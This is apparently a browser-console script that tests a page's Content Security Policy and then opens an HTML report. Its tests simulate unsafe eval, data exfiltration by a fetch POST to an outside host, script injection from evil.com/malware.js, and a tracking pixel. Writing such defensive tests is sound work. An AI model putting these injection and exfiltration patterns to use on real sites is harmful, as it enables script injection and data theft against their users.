// tools/csp-tester-v5.js
(function() {
    console.clear();
    console.log("%cCSP Test", "color: #e74c3c; font-weight: bold; font-size: 1.2em;");

    // --- 1. STATE ---
    const REPORT = {
        violations: [],
        results: {
            eval: { status: "PENDING", msg: "", payload: "", loc: "" },
            connect: { status: "PENDING", msg: "", payload: "", loc: "" },
            script: { status: "PENDING", msg: "", payload: "", loc: "" },
            img: { status: "PENDING", msg: "", payload: "", loc: "" }
        }
    };

    document.addEventListener("securitypolicyviolation", (e) => {
        REPORT.violations.push({
            directive: e.violatedDirective,
            blocked: e.blockedURI
        });
    });

    const testPromises = [];

    // --- 2. TESTS ---

    // TEST A: Unsafe Eval
    testPromises.push(new Promise((resolve) => {
        const payload = "eval('window.csp_check = true')";
        const loc = "JS Runtime (eval)";
        try {
            eval('window.csp_check = true');
            if (window.csp_check) {
                REPORT.results.eval = { status: "FAILED", msg: "Unsafe Eval allowed", payload: payload, loc: loc };
                delete window.csp_check;
            } else {
                REPORT.results.eval = { status: "PASSED", msg: "Eval blocked", payload: payload, loc: loc };
            }
            resolve();
        } catch (e) {
            REPORT.results.eval = { status: "PASSED", msg: "Eval threw error (Blocked)", payload: payload, loc: loc };
            resolve();
        }
    }));

    // TEST B: Data Exfiltration (Connect-Src)
    testPromises.push(new Promise((resolve) => {
        const url = "https://jsonplaceholder.typicode.com/posts";
        const body = '{"stolen":"data"}';
        const payload = `FETCH: ${url}\nBODY: ${body}`;
        const loc = "Network API (fetch)";

        fetch(url, { method: "POST", body: body })
        .then(r => {
            if(r.ok) {
                REPORT.results.connect = { status: "FAILED", msg: "Data sent via Fetch", payload: payload, loc: loc };
                resolve();
            } else {
                REPORT.results.connect = { status: "WARNING", msg: "Fetch failed (Check Network Tab)", payload: payload, loc: loc };
                resolve();
            }
        })
        .catch(err => {
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('connect'));
                if (blocked) {
                    REPORT.results.connect = { status: "PASSED", msg: "Blocked by CSP (connect-src)", payload: payload, loc: loc };
                } else {
                    REPORT.results.connect = { status: "WARNING", msg: "Failed (CORS/Network Error)", payload: payload, loc: loc };
                }
                resolve();
            }, 200);
        });
    }));

    // TEST C: Script Injection (Script-Src)
    testPromises.push(new Promise((resolve) => {
        const src = "https://evil.com/malware.js";
        const payload = `<script src="${src}"></script>`;
        const loc = "DOM (document.body)";

        const script = document.createElement('script');
        script.src = src;
        script.onload = () => {
            REPORT.results.script = { status: "FAILED", msg: "External Script Loaded", payload: payload, loc: loc };
            script.remove();
            resolve();
        };
        script.onerror = () => {
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('script'));
                if (blocked) {
                    REPORT.results.script = { status: "PASSED", msg: "Blocked by CSP (script-src)", payload: payload, loc: loc };
                } else {
                    REPORT.results.script = { status: "PASSED", msg: "Failed to load (Network Error)", payload: payload, loc: loc };
                }
                script.remove();
                resolve();
            }, 200);
        };
        document.body.appendChild(script);
    }));

    // TEST D: Pixel Tracking (Img-Src)
    testPromises.push(new Promise((resolve) => {
        const src = "https://evil.com/tracker.png";
        const payload = `<img src="${src}">`;
        const loc = "DOM (Image Object)";

        const img = new Image();
        img.src = src;
        img.onload = () => {
            REPORT.results.img = { status: "FAILED", msg: "Tracking Pixel Loaded", payload: payload, loc: loc };
            resolve();
        };
        img.onerror = () => {
            setTimeout(() => {
                const blocked = REPORT.violations.some(v => v.directive.includes('img'));
                if (blocked) {
                    REPORT.results.img = { status: "PASSED", msg: "Blocked by CSP (img-src)", payload: payload, loc: loc };
                } else {
                    REPORT.results.img = { status: "PASSED", msg: "Failed to load (Network Error)", payload: payload, loc: loc };
                }
                resolve();
            }, 200);
        };
    }));

    // --- 3. REPORT GENERATOR ---
    Promise.all(testPromises).then(() => {
        setTimeout(() => {
            const rawJSON = JSON.stringify(REPORT, null, 2);

            const html = `
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <title>CSP Report - ${window.location.hostname}</title>
                    <style>
                        body { background: #111; color: #ddd; font-family: 'Segoe UI', monospace; padding: 20px; }
                        h2 { border-bottom: 2px solid #e74c3c; padding-bottom: 5px; color: #e74c3c; margin-top: 30px; }
                        .box { background: #222; padding: 15px; border-radius: 5px; margin-bottom: 20px; border: 1px solid #444; }
                        textarea { width: 100%; height: 150px; background: #000; color: #2ecc71; border: 1px solid #444; padding: 10px; font-family: monospace; font-size: 11px; }
                        table { width: 100%; border-collapse: collapse; margin-top: 10px; background: #222; }
                        th, td { padding: 10px; border: 1px solid #444; text-align: left; font-size: 0.9em; }
                        th { background: #333; color: #fff; }
                        .badge { padding: 4px 8px; border-radius: 4px; font-weight: bold; font-size: 0.8em; }
                        .pass { background: #27ae60; color: #fff; }
                        .fail { background: #c0392b; color: #fff; }
                        .warn { background: #f39c12; color: #fff; }
                        code { background: #333; padding: 2px 4px; border-radius: 3px; font-family: monospace; color: #f1c40f; font-size: 0.85em; }
                        .loc { color: #3498db; font-style: italic; }
                    </style>
                </head>
                <body>
                    <h1>CSP Test</h1>
                    <div class="box">
                        <h3>📄 Raw JSON Report</h3>
                        <textarea id="jsonArea">${rawJSON}</textarea>
                    </div>

                    <h2>Attack Simulation Results</h2>
                    <table>
                        <thead><tr><th>Test Type</th><th>Status</th><th>Details</th><th>Payload Used</th><th>Injection Point</th></tr></thead>
                        <tbody>
                            ${Object.keys(REPORT.results).map(key => {
                                const r = REPORT.results[key];
                                const badgeClass = r.status === 'PASSED' ? 'pass' : (r.status === 'FAILED' ? 'fail' : 'warn');
                                // HTML Escape the payload
                                const displayPayload = r.payload.replace(/</g, "&lt;");
                                return `<tr>
                                    <td>${key.toUpperCase()}</td>
                                    <td><span class="badge ${badgeClass}">${r.status}</span></td>
                                    <td>${r.msg}</td>
                                    <td><code>${displayPayload}</code></td>
                                    <td class="loc">${r.loc}</td>
                                </tr>`;
                            }).join('')}
                        </tbody>
                    </table>

                    <h2>CSP Violations Triggered (${REPORT.violations.length})</h2>
                    <table>
                        <thead><tr><th>Directive</th><th>Blocked URI</th></tr></thead>
                        <tbody>
                            ${REPORT.violations.map(v => `<tr><td style="color:#e74c3c">${v.directive}</td><td>${v.blocked}</td></tr>`).join('')}
                        </tbody>
                    </table>

                    <script>document.getElementById('jsonArea').select();<\/script>
                </body>
                </html>
            `;

            const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
            const blobUrl = URL.createObjectURL(blob);
            const win = window.open(blobUrl, '_blank');
            if (!win) alert("⚠️ Popup Blocked! Allow popups to see the CSP report.");

        }, 500);
    });
})();